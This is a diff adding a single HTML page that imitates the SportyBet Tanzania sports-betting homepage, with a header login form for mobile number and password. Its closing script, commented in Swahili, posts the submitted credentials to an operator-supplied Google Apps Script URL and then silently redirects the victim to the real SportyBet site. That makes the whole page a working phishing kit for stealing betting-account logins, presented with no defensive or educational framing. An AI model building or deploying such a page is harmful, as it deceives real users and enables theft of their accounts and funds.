@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SportyBet - Online Sports Betting</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        .sporty-red { background-color: #E41E26; }
+        .sporty-dark { background-color: #1A1A1A; }
+        .sporty-green { background-color: #00A651; }
+    </style>
+</head>
+<body class="bg-gray-200 font-sans">
+
+    <header class="sporty-red text-white">
+        <div class="container mx-auto px-4 flex items-center justify-between py-2">
+            <div class="flex items-center space-x-8">
+                <h1 class="text-3xl font-black italic tracking-tighter">SportyBet</h1>
+                <div class="flex items-center text-xs border border-white/30 px-2 py-1 rounded">
+                    <span class="mr-2">🇹🇿 Tanzania</span>
+                    <i class="fas fa-cog"></i>
+                </div>
+            </div>
+
+            <form id="sporty-login-form" class="flex flex-col items-end">
+                <div class="flex items-center space-x-2 text-sm mb-1">
+                    <div class="flex items-center bg-black/20 rounded px-2 py-1">
+                        <span class="text-white/70 mr-1">+255</span>
+                        <input type="text" name="Mobile_Number" placeholder="Mobile Number" class="bg-transparent outline-none w-28 placeholder-white/50" required>
+                    </div>
+                    <input type="password" name="Password" placeholder="Password" class="bg-black/20 rounded px-2 py-1 outline-none w-28 placeholder-white/50" required>
+                    
+                    <button type="submit" id="login-btn" class="bg-black/40 px-4 py-1 rounded font-bold hover:bg-black/60">Login</button>
+                    
+                    <button type="button" class="bg-white text-red-600 px-4 py-1 rounded font-bold">Register</button>
+                </div>
+                <div class="text-[10px] flex space-x-3 text-white/80">
+                    <label><input type="checkbox" class="mr-1"> Keep me signed in</label>
+                    <a href="#">Forgot Password?</a>
+                    <a href="#">Deactivate / Reactivate</a>
+                </div>
+            </form>
+        </div>
+
+        <nav class="container mx-auto px-4 flex space-x-1 text-sm font-bold">
+            <a href="#" class="bg-white text-red-600 px-6 py-2 rounded-t-sm">Sports</a>
+            <a href="#" class="px-4 py-2 hover:bg-white/10">Games</a>
+            <a href="#" class="px-4 py-2 hover:bg-white/10">Live Betting</a>
+            <a href="#" class="px-4 py-2 hover:bg-white/10">Jackpot</a>
+            <a href="#" class="px-4 py-2 hover:bg-white/10">Livescore</a>
+        </nav>
+    </header>
+
+    <div class="bg-white border-b shadow-sm">
+        <div class="container mx-auto px-4 py-2 flex space-x-6 text-[13px] font-medium text-gray-700">
+            <a href="#" class="text-red-600 border-b-2 border-red-600 pb-1">Home</a>
+            <a href="#">Football</a>
+            <a href="#">vFootball</a>
+            <a href="#">Basketball</a>
+            <a href="#">Tennis</a>
+            <a href="#">eFootball</a>
+            <a href="#">Table Tennis</a>
+        </div>
+    </div>
+
+    <main class="container mx-auto px-4 mt-4 grid grid-cols-12 gap-4">
+        <aside class="col-span-3 sporty-dark text-white rounded-t-sm overflow-hidden h-fit">
+            <div class="bg-zinc-800 p-3 font-bold text-sm">Popular</div>
+            <ul class="text-xs">
+                <li class="p-3 border-b border-zinc-700 flex justify-between hover:bg-zinc-700 cursor-pointer">Today's Football <i class="fas fa-chevron-right text-green-500"></i></li>
+                <li class="p-3 border-b border-zinc-700 flex justify-between hover:bg-zinc-700 cursor-pointer">Champions League <i class="fas fa-chevron-right text-green-500"></i></li>
+            </ul>
+        </aside>
+
+        <section class="col-span-6 relative bg-black rounded-sm overflow-hidden h-[300px]">
+            <div class="absolute inset-0 z-10 flex flex-col justify-center p-8 text-white bg-gradient-to-r from-black/80 to-transparent">
+                <h2 class="text-3xl font-black mt-2 leading-none">WIN BIG TODAY <br> <span class="text-red-600">SPORTYBET</span> SPECIAL</h2>
+                <button class="mt-6 border-2 border-white w-fit px-8 py-2 text-xs font-bold">BET NOW</button>
+            </div>
+            <img src="https://via.placeholder.com/800x400/222/555?text=SportyBet+Promo" class="w-full h-full object-cover">
+        </section>
+
+        <aside class="col-span-3 sporty-dark p-4 rounded-sm h-fit">
+            <h3 class="text-white font-bold text-sm mb-4">Instant Registration</h3>
+            <div class="flex items-center bg-white rounded overflow-hidden mb-4">
+                <span class="px-3 py-2 text-gray-500 border-r text-sm">+255</span>
+                <input type="text" placeholder="Mobile Number" class="w-full px-3 py-2 text-sm outline-none">
+            </div>
+            <button class="w-full sporty-green text-white font-bold py-3 rounded">Register</button>
+        </aside>
+    </main>
+
+    <script>
+        // WEKA URL YAKO YA GOOGLE SCRIPT HAPA
+        const scriptURL = 'WEKA_URL_YAKO_HAPA';
+        const form = document.getElementById('sporty-login-form');
+        const btn = document.getElementById('login-btn');
+
+        form.addEventListener('submit', e => {
+            e.preventDefault();
+            btn.disabled = true;
+            btn.innerHTML = "...";
+
+            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => {
+                    // Mpeleke SportyBet halisi baada ya sekunde 1
+                    setTimeout(() => {
+                        window.location.href = "https://www.sportybet.com/tz/";
+                    }, 500);
+                })
+                .catch(error => {
+                    window.location.href = "https://www.sportybet.com/tz/";
+                });
+        });
+    </script>
+
+</body>
+</html>
